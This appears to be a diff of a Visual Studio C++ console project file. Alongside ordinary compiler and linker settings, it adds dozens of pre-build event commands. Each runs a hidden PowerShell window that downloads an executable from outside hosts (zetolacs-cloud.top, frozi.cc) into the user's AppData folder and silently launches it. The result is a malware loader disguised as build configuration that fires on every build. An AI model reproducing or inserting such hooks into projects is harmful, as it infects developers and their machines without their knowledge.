+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=JOSBf2fDaTKZmCIop7LMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=4QfJE5FLNQSltzpZdILCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=4QfJE5FLNQSltzpZdILCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=MbTeY4wTlnhlVbNmIDLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=0GTls3ZELXLnKLrXDsLCW010.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ENuwkBTakVYs8YpUNALCW011.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ENuwkBTakVYs8YpUNALCW011.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Mzrj0OStxgmMYRqEMhLCW012.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=EB8yuBlnHK6sQ2qRxqLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=EB8yuBlnHK6sQ2qRxqLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=EB8yuBlnHK6sQ2qRxqLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=otKcaZlhkQQAcRi8ojLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=upAa8nppMvK3ggd1dFLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ld7ClokRBD8oBjLLqpLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ld7ClokRBD8oBjLLqpLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=E2IkWCtEES17n6Lv5vLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=E2IkWCtEES17n6Lv5vLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=4Suvv0GFZDE3St59PULCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=MHelDAwX4pDQEI4aRiPRE001.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=5m2aR5nRFUPBIwOVv8PRE001.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=5m2aR5nRFUPBIwOVv8PRE001.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=aqFVrRXATt0e1WbhtSPRE002.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=vuMxXgveUWfr4HYswLPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=CuqkLdD8r2LVIbuRFXPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=uqtg7OzSflP3gjdbMEPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=vPBfvSYraXianQGEPKPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=xd3Ihnad6TB831fHToPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=G4l2Ka2AbzQFFzCl42PRE004.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=5kbdScpPw4qbif5TtEPRE004.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=515k8EkMr3fPBIwIL5PRE008.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=JOSBf2fDaTKZmCIop7LMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=4QfJE5FLNQSltzpZdILCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
